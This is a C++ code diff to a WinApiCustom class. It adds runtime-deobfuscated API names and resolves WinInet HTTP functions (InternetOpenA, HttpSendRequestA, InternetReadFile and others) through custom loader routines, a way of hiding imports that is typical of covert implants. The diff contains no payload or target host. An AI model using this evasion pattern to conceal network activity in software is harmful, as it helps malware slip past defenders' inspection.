@@ -171,6 +171,12 @@ WinApiCustom::WinApiCustom()
 		STRING_USER32_DLL_LEN,
 		strUser32Dll);
 
+	static CHAR strWininetDll[STRING_WININET_DLL_LEN + 1] = ""; // "Wininet.dll"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_WININET_DLL,
+		STRING_WININET_DLL_LEN,
+		strWininetDll);
+
 	// Get necessary strings for functions
 	static CHAR strMessageBoxA[STRING_MESSAGEBOX_A_LEN + 1] = ""; // "MessageBoxA"
 	DeobfuscateUtf8String(
@@ -178,17 +184,109 @@ WinApiCustom::WinApiCustom()
 		STRING_MESSAGEBOX_A_LEN,
 		strMessageBoxA);
 
+	static CHAR strLoadLibraryA[STRING_LOAD_LIBRARY_A_LEN + 1] = ""; // "LoadLibraryA"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_LOAD_LIBRARY_A,
+		STRING_LOAD_LIBRARY_A_LEN,
+		strLoadLibraryA);
+
+	static CHAR strFreeLibrary[STRING_FREE_LIBRARY_LEN + 1] = ""; // "FreeLibrary"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_FREE_LIBRARY,
+		STRING_FREE_LIBRARY_LEN,
+		strFreeLibrary);
+
+	static CHAR strInternetOpenA[STRING_INTERNET_OPEN_A_LEN + 1] = ""; // "InternetOpenA"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_INTERNET_OPEN_A,
+		STRING_INTERNET_OPEN_A_LEN,
+		strInternetOpenA);
+
+	static CHAR strInternetConnectA[STRING_INTERNET_CONNECT_A_LEN + 1] = ""; // "InternetConnectA"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_INTERNET_CONNECT_A,
+		STRING_INTERNET_CONNECT_A_LEN,
+		strInternetConnectA);
+
+	static CHAR strHttpOpenRequestA[STRING_HTTP_OPEN_REQUEST_A_LEN + 1] = ""; // "HttpOpenRequestA"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_HTTP_OPEN_REQUEST_A,
+		STRING_HTTP_OPEN_REQUEST_A_LEN,
+		strHttpOpenRequestA);
+
+	static CHAR strHttpSendRequestA[STRING_HTTP_SEND_REQUEST_A_LEN + 1] = ""; // "HttpSendRequestA"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_HTTP_SEND_REQUEST_A,
+		STRING_HTTP_SEND_REQUEST_A_LEN,
+		strHttpSendRequestA);
+
+	static CHAR strInternetReadFile[STRING_INTERNET_READ_FILE_LEN + 1] = ""; // "InternetReadFile"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_INTERNET_READ_FILE,
+		STRING_INTERNET_READ_FILE_LEN,
+		strInternetReadFile);
+
+	static CHAR strInternetCloseHandle[STRING_INTERNET_CLOSE_HANDLE_LEN + 1] = ""; // "InternetCloseHandle"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_INTERNET_CLOSE_HANDLE,
+		STRING_INTERNET_CLOSE_HANDLE_LEN,
+		strInternetCloseHandle);
+
+	static CHAR strInternetSetOptionA[STRING_INTERNET_SET_OPTION_A_LEN + 1] = ""; // "InternetSetOptionA"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_INTERNET_SET_OPTION_A,
+		STRING_INTERNET_SET_OPTION_A_LEN,
+		strInternetSetOptionA);
+
+	static CHAR strGetProcessHeap[STRING_GET_PROCESS_HEAP_LEN + 1] = ""; // "GetProcessHeap"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_GET_PROCESS_HEAP,
+		STRING_GET_PROCESS_HEAP_LEN,
+		strGetProcessHeap);
+
+	static CHAR strHeapAlloc[STRING_HEAP_ALLOC_LEN + 1] = ""; // "HeapAlloc"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_HEAP_ALLOC,
+		STRING_HEAP_ALLOC_LEN,
+		strHeapAlloc);
+
+	static CHAR strHeapReAlloc[STRING_HEAP_RE_ALLOC_LEN + 1] = ""; // "HeapReAlloc"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_HEAP_RE_ALLOC,
+		STRING_HEAP_RE_ALLOC_LEN,
+		strHeapReAlloc);
+
+	static CHAR strGetLastError[STRING_GET_LAST_ERROR_LEN + 1] = ""; // "GetLastError"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_GET_LAST_ERROR,
+		STRING_GET_LAST_ERROR_LEN,
+		strGetLastError);
+
 	// Load necessary modules
 	loadedModules.hKernel32 = LoadLibraryCustom(strKernel32Dll);
 	loadedModules.hUser32 = LoadLibraryCustom(strUser32Dll);
+	loadedModules.hWininet = LoadLibraryCustom(strWininetDll);
 
 	// Load necessary functions
 	loadedFunctions.MessageBoxA = (int (*)(HWND, LPCSTR, LPCSTR, UINT))GetProcAddressCustom(loadedModules.hUser32, strMessageBoxA);
+	loadedFunctions.LoadLibraryA = (HMODULE(*)(LPCSTR lpLibFileName))GetProcAddressCustom(loadedModules.hKernel32, strLoadLibraryA);
+	loadedFunctions.FreeLibrary = (BOOL(*)(HMODULE hLibModule))GetProcAddressCustom(loadedModules.hKernel32, strFreeLibrary);
+	loadedFunctions.InternetOpenA = (HINTERNET(*)(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags))GetProcAddressCustom(loadedModules.hWininet, strInternetOpenA);
+	loadedFunctions.InternetConnectA = (HINTERNET(*)(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext))GetProcAddressCustom(loadedModules.hWininet, strInternetConnectA);
+	loadedFunctions.HttpOpenRequestA = (HINTERNET(*)(HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR * lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext)) GetProcAddressCustom(loadedModules.hWininet, strHttpOpenRequestA);
+	loadedFunctions.HttpSendRequestA = (BOOL(*)(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength))GetProcAddressCustom(loadedModules.hWininet, strHttpSendRequestA);
+	loadedFunctions.InternetReadFile = (BOOL(*)(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead))GetProcAddressCustom(loadedModules.hWininet, strInternetReadFile);
+	loadedFunctions.InternetCloseHandle = (BOOL(*)(HINTERNET hInternet))GetProcAddressCustom(loadedModules.hWininet, strInternetCloseHandle);
+	loadedFunctions.InternetSetOptionA = (BOOL(*)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength))GetProcAddressCustom(loadedModules.hWininet, strInternetSetOptionA);
+	loadedFunctions.GetProcessHeap = (HANDLE(*)())GetProcAddressCustom(loadedModules.hKernel32, strGetProcessHeap);
+	loadedFunctions.HeapAlloc = (LPVOID(*)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes))GetProcAddressCustom(loadedModules.hKernel32, strHeapAlloc);
+	loadedFunctions.HeapReAlloc = (LPVOID(*)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes))GetProcAddressCustom(loadedModules.hKernel32, strHeapReAlloc);
+	loadedFunctions.GetLastError = (DWORD(*)())GetProcAddressCustom(loadedModules.hKernel32, strGetLastError);
 }
 
 WinApiCustom::~WinApiCustom()
 {
 	// Free library (modules)
-	//FreeLibraryCustom(loadedModules.hKernel32);
+	// FreeLibraryCustom(loadedModules.hKernel32);
 	FreeLibraryCustom(loadedModules.hUser32);
 }
